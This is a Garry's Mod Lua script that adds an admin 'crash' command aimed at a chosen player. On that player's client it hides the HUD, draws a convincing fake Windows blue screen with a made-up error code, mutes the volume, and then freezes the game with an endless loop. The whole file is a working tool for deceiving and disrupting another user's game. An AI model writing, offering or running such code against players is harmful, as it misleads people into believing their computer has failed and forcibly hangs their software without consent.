AddCSLuaFile()

local Tag = "bluescreen"

if SERVER then
	util.AddNetworkString(Tag)

	aowl.AddCommand("bloo|crash=player_admin|player_alter", function(ply, line, target)
		net.Start(Tag)
		net.Send(target)
	end, "developers")
end

if CLIENT then
	net.Receive(Tag,function()
		local hide = {
			CHudHealth = true,
			CHudBattery = true,
			CHudAmmo = true,
			CHudChat = true,
			CHudCrosshair = true,
			CHudDamageIndicator = true,
			CHudDeathNotice = true,
			CHudGeiger = true,
			CHudHealth = true,
			CHudHintDisplay = true,
			CHudMenu = true,
			CHudMessage = true,
			CHudPoisonDamageIndicator = true,
			CHudSecondaryAmmo = true,
			CHudSquadStatus = true,
			CHudTrain = true,
			CHudWeapon = true,
			CHudWeaponSelection = true,
			CHudZoom = true,
			NetGraph = true,
		}

		hook.Add( "HUDShouldDraw", "BreakiHide", function( name )
			if ( hide[ name ] ) then return false end
		end )

		surface.CreateFont( "bluscreenfont70", {
			font = "arial",
			size = 1000,
			weight = 1000,
		} )

		surface.CreateFont( "bluscreenfont40", {
			font = "arial",
			size = 40,
			weight = 600,
		} )

		surface.CreateFont( "bluscreenfont20", {
			font = "arial",
			size = 20,
			weight = 500,
		} )

		hook.Add("HUDPaint","Breaki",function()
			surface.SetDrawColor(17,115,170)
			surface.DrawRect(0,0,ScrW(),ScrH())
			surface.SetTextColor(Color(255,255,255))

			surface.SetFont("bluscreenfont70")
			local x1,y1 = surface.GetTextSize(":(")
			surface.SetTextPos(	ScrW()/4.5 - x1/2,ScrH()/2 - y1/2)
			surface.DrawText(":(")

			surface.SetFont("bluscreenfont40")
			local x2,y2 = surface.GetTextSize("Your PC ran into a problem that it couldn't")
			y2 =  y1/2 + y2
			surface.SetTextPos(	ScrW()/3 - x2/2,ScrH()/2 + y2)
			surface.DrawText("Your PC ran into a problem that it couldn't")

			surface.SetFont("bluscreenfont40")
			local x3,y3 = surface.GetTextSize("handle, and now it needs to restart.")
			y3 =  y2 + 5 + y3
			surface.SetTextPos(	ScrW()/3 - x2/2,ScrH()/2 + y3)
			surface.DrawText("handle, and now it needs to restart.")


			surface.SetFont("bluscreenfont20")
			local x4,y4 = surface.GetTextSize("You can search for the error online: HAL_INITIALIZATION_FAILED")
			y4 =  y3 + 40 + y4
			surface.SetTextPos(	ScrW()/3 - x2/2,ScrH()/2 + y4)
			surface.DrawText("You can search for the error online: HAL_INITIALIZATION_FAILED")

		end)

		RunConsoleCommand("volume","0")

		timer.Simple(1,function() while true do end end)
	end)
end
